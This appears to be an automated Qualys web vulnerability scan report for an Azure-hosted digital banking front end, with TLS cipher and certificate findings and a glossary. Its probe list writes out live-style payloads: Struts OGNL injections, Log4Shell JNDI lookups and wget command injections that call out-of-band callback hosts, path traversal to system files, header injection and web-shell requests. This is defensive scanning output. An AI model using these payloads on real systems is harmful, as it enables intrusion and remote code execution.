"Web Application Report","22 Feb 2024 11:26AM GMT+0530"
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/?id=%25%7B%28%23request%2Emap%3D%23%40org%2Eapache%2Ecommons%2Ecollections%2EBeanMap%40%7B%7D%29%2EtoString%28%29%2Esubstring%280%2C0%29%20%2B%28%23request%2Emap%2EsetBean%28%23request%2Eget%28%27struts%2EvalueStack%27%29%29%20%3D%3D%20true%29%2EtoString%28%29%2Esubstring%280%2C0%29%20%2B%28%23request%2Emap2%3D%23%40org%2Eapache%2Ecommons%2Ecollections%2EBeanMap%40%7B%7D%29%2EtoString%28%29%2Esubstring%280%2C0%29%20%2B%28%23request%2Emap2%2EsetBe
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/RandomFilebP6DZKsx0c2M.jsp/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/skill/list.action -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name=""skillName""

(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) ==
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico.zip
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/logs/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/%24%7B%23foo%3D%27%25%7B%20134%20%2a%2031%20%2a%2053%20%2a%2097%20-13579%20%7D%27%2C%20%23foo%7D
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico_async/AsyncResponseService -FORMDATA- &lt;soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:wsa=""http://www.w3.org/2005/08/addressing"" xmlns:asy=""http://www.bea.com/async/AsyncResponseService""&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=""http://bea.com/2004/06/soap/workarea/""&gt;&lt;java&gt;&lt;class&gt;&lt;string&gt;org.slf4j.ext.EventData&lt;/string&gt;&lt;void&gt;&lt;string&gt;&lt;![CD
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/jquery/jquery.validate.js
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/../../../../../../../../../../Progra~1/desktop.ini
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/db/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/.tar.gz
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/Search.jsp -FORMDATA- query=\${jndi:ldap://cf27247871261adc36e335713795397def4c0ba7.729973036092606.3370712392.webcgioob15044045.webcgioob.oob.default.qualys.com/a}
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/JspSpy.jsp
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/solr/admin/collections -FORMDATA- action=\${jndi:rmi://f69447ec4e1583bb192722161aaab1e98d92a4d8.729973036092606.3236168650.webcgioob15044028.webcgioob.oob.default.qualys.com/a}
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/simple-backdoor.php?cmd=id
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net//../../../../../../../../../Windows/System32/drivers/etc/hosts
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/sources/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/administration/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/index.bat?&set&qualyswas
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/druid/coordinator/v1/lookups/config/$%7bjndi:rmi:%2f%2f615a8e054fac5e2ea5a7247fb8c1fba77407ddb2.729973036092606.4152197998.webcgioob15044040.webcgioob.oob.default.qualys.com%2fa%7d
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/../../favicon.ico.test1
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/$%7Bjndi:ldap://87f7a5d701bf9e5c55342081f7dc3c34eb762d6a.729973036092606.1435678717.webcgioob15044041.webcgioob.oob.default.qualys.com/QualysWAS%7D
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/%27
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico?""&gt;&lt;qss&gt;=
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/extranet/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/$%7Bjndi:$%7Blower:l%7D$%7Blower:d%7D$%7Blower:a%7D$%7Blower:p%7D://f3cbbe052a5d8e1f94d05d525cbe1e0df5165f0f.729973036092606.2276069814.webcgioob15044044.webcgioob.oob.default.qualys.com/QualysWAS%7D
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/?doAs=%60wget+http%3a//757d0c4fc98bc71715544ff175e02fd50295c813.729973036092606.1295522928.webcgioob15055703.webcgioob.oob.default.qualys.com%60
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/temp/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/zehir4.asp
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/www/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/?welcome_message=q%0d%0a%20Qualys_resp_hdr_injection:%20Vulnerable
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.orig
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/BUGS
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/api/getServices?name%5B%5D=$(wget%20http://710b1b6643196a29d3e7e623b97cb74d887a026f.729973036092606.411116520.webcgioob15050302.webcgioob.oob.default.qualys.com)
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico.test2
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/index.action -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name=""id""

%{
(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map2.setBean(#request.get('map').get('context')) == t
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/internet/
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/?doAs=%60wget+http%3a//48ff6a6bc3b70f36e2c74c62917788b2dc33ace1.729973036092606.1501929911.webcgioob15055703.webcgioob.oob.default.qualys.com%60
   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.old

Phase wise summary of timeout and connection errors encountered: 
ePhaseCMSDetection                 :          0        16
ePhaseWSDirectoryPathTests         :          0         3
ePhaseWSEnumeration                :          0         5
ePhaseWebCgiOob                    :          0        94
ePhaseHeaderTests                  :          0        61
ePhasePathXssTests                 :          0        14
ePhaseTomcatTests                  :          0         1
ePhasePathTests                    :          0       100
","16 Feb 2024 12:08AM GMT+0530","ac52ede2-a4a8-4a7a-b99d-1138aac31e24","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261582","42350","","16 Feb 2024 12:08AM GMT+0530","b23241b4-2d4d-45df-89d8-8a8d18fad9df","","tcp","20.192.170.11","20.192.170.11","443","TLS Secure Renegotiation Extension Status: supported.",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261584","38116","","16 Feb 2024 12:08AM GMT+0530","715484b6-64ed-43ee-8977-19f6a92d2329","","tcp","20.192.170.11","20.192.170.11","443","#table cols=""6""
CIPHER KEY-EXCHANGE AUTHENTICATION MAC ENCRYPTION(KEY-STRENGTH) GRADE
SSLv2_PROTOCOL_IS_DISABLED _ _ _ _ _
SSLv3_PROTOCOL_IS_DISABLED _ _ _ _ _
TLSv1_PROTOCOL_IS_DISABLED _ _ _ _ _
TLSv1.1_PROTOCOL_IS_DISABLED _ _ _ _ _
TLSv1.2_PROTOCOL_IS_ENABLED _ _ _ _ _
TLSv1.2 COMPRESSION_METHOD None _ _ _
AES128-SHA RSA RSA SHA1 AES(128) MEDIUM
AES256-SHA RSA RSA SHA1 AES(256) HIGH
AES128-GCM-SHA256 RSA RSA AEAD AESGCM(128) MEDIUM
AES256-GCM-SHA384 RSA RSA AEAD AESGCM(256) HIGH
ECDHE-RSA-AES128-SHA ECDH RSA SHA1 AES(128) MEDIUM
ECDHE-RSA-AES256-SHA ECDH RSA SHA1 AES(256) HIGH
ECDHE-RSA-AES128-SHA256 ECDH RSA SHA256 AES(128) MEDIUM
ECDHE-RSA-AES256-SHA384 ECDH RSA SHA384 AES(256) HIGH
ECDHE-RSA-AES128-GCM-SHA256 ECDH RSA AEAD AESGCM(128) MEDIUM
ECDHE-RSA-AES256-GCM-SHA384 ECDH RSA AEAD AESGCM(256) HIGH
AES128-SHA256 RSA RSA SHA256 AES(128) MEDIUM
AES256-SHA256 RSA RSA SHA256 AES(256) HIGH
TLSv1.3_PROTOCOL_IS_ENABLED _ _ _ _ _
TLS13-AES-128-GCM-SHA256 N/A N/A AEAD AESGCM(128) MEDIUM
TLS13-AES-256-GCM-SHA384 N/A N/A AEAD AESGCM(256) HIGH
","CIPHERS
CIPHER(1)
	Name:TLS13-AES-128-GCM-SHA256 Auth:N/A Encryption:AESGCM(128) Grade:MEDIUM Key-Exchange:N/A Mac:AEAD Protocol:TLSv1.3
CIPHER(2)
	Name:TLS13-AES-256-GCM-SHA384 Auth:N/A Encryption:AESGCM(256) Grade:HIGH Key-Exchange:N/A Mac:AEAD Protocol:TLSv1.3
"
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261573","150009","Duration of crawl phase (seconds): 307.00
Number of links: 2
(This number excludes form requests and links re-requested during authentication.)

https://fint-int-digitalbankingui-nra.azurewebsites.net/
https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico
","16 Feb 2024 12:08AM GMT+0530","a4d29706-bd5d-49ee-ba49-d82aefdb09b9","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261577","38291","","16 Feb 2024 12:08AM GMT+0530","46a739d3-f733-4142-b9a5-a6d72421c130","","tcp","20.192.170.11","20.192.170.11","443","TLSv1.2 session caching is disabled on the target.
TLSv1.3 session caching is disabled on the target.
",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261585","38704","","16 Feb 2024 12:08AM GMT+0530","48fa81b6-6f7b-4a9d-aa67-7f20fd488889","","tcp","20.192.170.11","20.192.170.11","443","#table cols=""6""
NAME GROUP KEY-SIZE FORWARD-SECRET CLASSICAL-STRENGTH QUANTUM-STRENGTH
TLSv1.2 _ _ _ _ _
RSA _ 2048 no 110 low
ECDHE secp521r1 521 yes 260 low
ECDHE secp384r1 384 yes 192 low
ECDHE secp256r1 256 yes 128 low
TLSv1.3 _ _ _ _ _
ECDHE secp521r1 521 yes 260 low
ECDHE secp384r1 384 yes 192 low
ECDHE secp256r1 256 yes 128 low
","KEXS
KEX(1)
	Kex:RSA Group: Protocol:TLSv1.2 KeySize:2048 FwdSec:no Classical:110 Quantum:low
KEX(2)
	Kex:ECDHE Group: Protocol:TLSv1.2 KeySize:521 FwdSec:yes Classical:260 Quantum:low
KEX(3)
	Kex:ECDHE Group: Protocol:TLSv1.2 KeySize:384 FwdSec:yes Classical:192 Quantum:low
KEX(4)
	Kex:ECDHE Group: Protocol:TLSv1.2 KeySize:256 FwdSec:yes Classical:128 Quantum:low
KEX(5)
	Kex:ECDHE Group: Protocol:TLSv1.3 KeySize:521 FwdSec:yes Classical:260 Quantum:low
KEX(6)
	Kex:ECDHE Group: Protocol:TLSv1.3 KeySize:384 FwdSec:yes Classical:192 Quantum:low
KEX(7)
	Kex:ECDHE Group: Protocol:TLSv1.3 KeySize:256 FwdSec:yes Classical:128 Quantum:low
"
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261581","38718","","16 Feb 2024 12:08AM GMT+0530","177653fa-dec1-4a83-ac4d-e8f26abfbfbd","","tcp","20.192.170.11","20.192.170.11","443","#table cols=""6""
Source Validated Name URL ID Time
Certificate_#0 _ CN=*.azurewebsites.net,O=Microsoft_Corporation,L=Redmond,ST=WA,C=US _ _ _
Certificate no (unknown) (unknown) eecdd064d5db1acec55cb79db4cd13a23287467cbcecdec351485946711fb59b Thu_01_Jan_1970_12:00:00_AM_GMT
Certificate no (unknown) (unknown) 48b0e36bdaa647340fe56a02fa9d30eb1c5201cb56dd2c81d9bbbfab39d88473 Thu_01_Jan_1970_12:00:00_AM_GMT
Certificate yes Comodo_'Sabre'_CT_log sabre.ct.comodo.com/ 5581d4c2169036014aea0b9b573c53f0c0e43878702508172fa3aa1d0713d30c Mon_18_Dec_2023_08:47:23_AM_GMT
","Certificate Fingerprint:00CF19054BB3EFFC62AAABC1196C42753EBDB19191BBBF8AD950CFA62D01AE78
"
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261571","150010","Number of links: 2
https://portal.azure.com/
https://go.microsoft.com/fwlink/?linkid=2095007
","16 Feb 2024 12:08AM GMT+0530","d5181f79-075e-494b-a032-861fe553e5b3","","","","","","",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261587","45038","","16 Feb 2024 12:08AM GMT+0530","29c55a19-9835-44d6-ba20-e98674debefd","","","fint-int-digitalbankingui-nra.azurewebsites.net","20.192.170.11","","Scan duration: 2217 seconds
Start time: Thu Feb 15 18:38:31 UTC 2024
End time: Thu Feb 15 19:15:28 UTC 2024",""
"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261576","6","","16 Feb 2024 12:08AM GMT+0530","d97cd7ab-afd0-4dac-a471-ecf5973739a7","","","20.192.170.11","20.192.170.11","","#table
IP_address Host_name
20.192.170.11 No_registered_hostname
",""
"GLOSSARY"
"QID","Id","Title","Category","Severity Level","Groups","OWASP","WASC","CWE","CVSS Base","CVSS Temporal","Description","Impact","Solution","CVSS V3 Base","CVSS V3 Temporal","CVSS V3 Attack Vector"
"QID","6","DNS Host Name","Information Gathered","1","DIAG","","","",,,"The fully qualified domain name of this host, if it was obtained from a DNS server, is displayed in the RESULT section.","N/A","N/A",,,""
"QID","38116","SSL Server Information Retrieval","Information Gathered","1","DIAG","","","",,,"<P>The following is a list of supported SSL ciphers.<P>
Note: If a cipher is included in this list it means that it was possible to establish a SSL connection using that cipher. There are some web servers setups that allow connections to be established using a LOW grade cipher, only to provide a web page stating that the URL is accessible only through a non-LOW grade cipher. In this case even though LOW grade cipher will be listed here QID 38140 will not be reported.
<P>
","N/A","N/A",,,""
"QID","38291","SSL Session Caching Information","Information Gathered","1","DIAG","","","",,,"SSL session is a collection of security parameters that are negotiated by the SSL client and server for each SSL connection. SSL session caching is targeted to reduce the overhead of negotiations in recurring SSL connections. SSL sessions can be reused to resume an earlier connection or to establish multiple simultaneous connections. The client suggests an SSL session to be reused by identifying the session with a Session-ID during SSL handshake. If the server finds it appropriate to reuse the session,  then they both proceed to secure communication with already known security parameters.
<P>
This test determines if SSL session caching is enabled on the host.","SSL session caching is part of the SSL and TLS protocols and is not a security threat. The result of this test is for informational purposes only.","N/A",,,""
"QID","38597","Secure Sockets Layer/Transport Layer Security (SSL/TLS) Invalid Protocol Version Tolerance","Information Gathered","1","DIAG","","","",,,"SSL/TLS protocols have different version that can be supported by both the client and the server. This test attempts to send invalid protocol versions to the target in order to find out what is the target's behavior. The results section contains a table that indicates what was the target's response to each of our tests.","N/A","N/A",,,""
"QID","38600","SSL Certificate will expire within next six months","Information Gathered","1","DIAG","","","",,,"Certificates are used for authentication purposes in different protocols such as SSL/TLS. Each certificate has a validity period outside of which it is supposed to be considered invalid. This QID is reported to inform that a certificate will expire within next six months. The advance notice can be helpful since obtaining a certificate can take some time.","Expired certificates can cause connection disruptions or compromise the integrity and privacy of the connections being protected by the certificates.","Contact the certificate authority that signed your certificate to arrange for a renewal.",,,""
"QID","38704","Secure Sockets Layer/Transport Layer Security (SSL/TLS) Key Exchange Methods","Information Gathered","1","DIAG","","","",,,"The following is a list of SSL/TLS key exchange methods supported by the server, along with their respective key sizes, strengths and ciphers.","N/A","N/A",,,""
"QID","38706","Secure Sockets Layer/Transport Layer Security (SSL/TLS) Protocol Properties","Information Gathered","1","DIAG","","","",,,"The following is a list of detected SSL/TLS protocol properties."," Items include:<P><UL>
<LI>Extended Master Secret: indicates whether the extended_master_secret extension is supported or required by the server. This extension enhances security and is recommended. Applicable to TLSv1, TLSv1.1, TLSv1.2, DTLSv1, DTLSv1.2</LI>
<LI>Encrypt Then MAC: indicates whether the encrypt_then_mac extension is supported or required by the server. This extension enhances the security of non-AEAD ciphers and is recommended. Applicable to TLSv1, TLSv1.1, TLSv1.2, DTLSv1, DTLSv1.2</LI>
<LI>Heartbeat: indicates whether the heartbeat extension is supported. It is not recommended to enable this, except for DTLS. Applicable to TLSv1, TLSv1.1, TLSv1.2, TLSv1.3, DTLSv1, DTLSv1.2</LI>
<LI>Truncated HMAC: indicates whether the truncated_hmac extension is supported. This can degrade security and is not recommended. Applicable to TLSv1, TLSv1.1, TLSv1.2, DTLSv1, DTLSv1.2</LI>
<LI>Cipher priority: indicates whether client, server or both determine the priority of ciphers. Having the server determine the priority is recommended. Applicable to SSLv3, TLSv1, TLSv1.1, TLSv1.2, TLSv1.3, DTLSv1, DTLSv1.2</LI>
</UL>
","N/A",,,""
"QID","38717","Secure Sockets Layer (SSL) Certificate Online Certificate Status Protocol (OCSP) Information","Information Gathered","1","DIAG","","","",,,"<P>OCSP (Online Certificate Status Protocol) is a protocol to determine the status of an SSL certificate, specifically whether a certificate has been revoked by the issuing certificate authority. SSL servers can provide the OCSP status of their certificate as part of the SSL/TLS handshake. This information is referred to as ""Status Request"" or ""OCSP Stapling"".
","N/A","N/A",,,""
"QID","38718","Secure Sockets Layer (SSL) Certificate Transparency Information","Information Gathered","1","DIAG","","","",,,"<P>SSL Certificate Transparency is an industry effort to improve visibility into the process of how certificate authorities issue certificates. It is designed to allow the owners of domain names to find all certificates that have been issued for their domains, and which certificate authorities have issued them. This is done by requiring certificate authorities to publish all issued certificates in public logs. TLS servers can then provide cryptographic evidence to TLS clients that the server certificate has been registered in public logs, thus providing some degree of confidence that the certificate is legitimate. Such cryptographic evidence is referred to as an ""SCT Log Proof"".
<P>The information below lists all validated SCT Log Proofs for server certificates along with information about the public log, where available.
","N/A","N/A",,,""
"QID","42350","TLS Secure Renegotiation Extension Support Information","Information Gathered","1","DIAG","","","",,,"Secure Socket Layer (SSL) and Transport Layer Security (TLS) renegotiation are vulnerable to an attack in which the attacker forms a TLS connection with the target server, injects content of his choice, and then splices in a new TLS connection from a client. The server treats the client's initial TLS handshake as a renegotiation and thus believes that the initial data transmitted by the attacker is from the same entity as the subsequent client data. TLS protocol was extended to cryptographically tierenegotiations to the TLS connections they are being performed over. This is referred to as TLS secure renegotiation extension. This detection determines whether the TLS secure renegotiation extension is supported by the server or not.","N/A","N/A",,,""
"QID","45038","Host Scan Time - Scanner","Information Gathered","1","DIAG","","","",,,"The Host Scan Time is the period of time it takes the scanning engine to perform the vulnerability assessment of a single target host. The Host Scan Time for this host is reported in the Result section below. 
<P>
The Host Scan Time does not have a direct correlation to the Duration time as displayed in the Report Summary section of a scan results report. The Duration is the period of time it takes the service to perform a scan task. The Duration includes the time it takes the service to scan all hosts, which may involve parallel scanning. It also includes the time it takes for a scanner appliance to pick up the scan task and transfer the results back to the service's Secure Operating Center. Further, when a scan task is distributed across multiple scanners, the Duration includes the time it takes to perform parallel host scanning on all scanners.
<P>","N/A","N/A",,,""
"QID","86002","SSL Certificate - Information","Information Gathered","1","DIAG","","","",,,"SSL certificate information is provided in the Results section.","N/A","N/A",,,""
"QID","150009","Links Crawled","Information Gathered","1","DIAG","","","",,,"The list of unique links crawled and HTML forms submitted by the scanner appear in the Results section. This list may contain fewer links than the maximum threshold defined. 
<P>NOTE: This list also includes:<BR>
- All the unique links that are reported in QID 150140 (Redundant links/URL paths crawled and not crawled)<BR>
- All the forms reported in QID 150152 (Forms Crawled)<BR> 
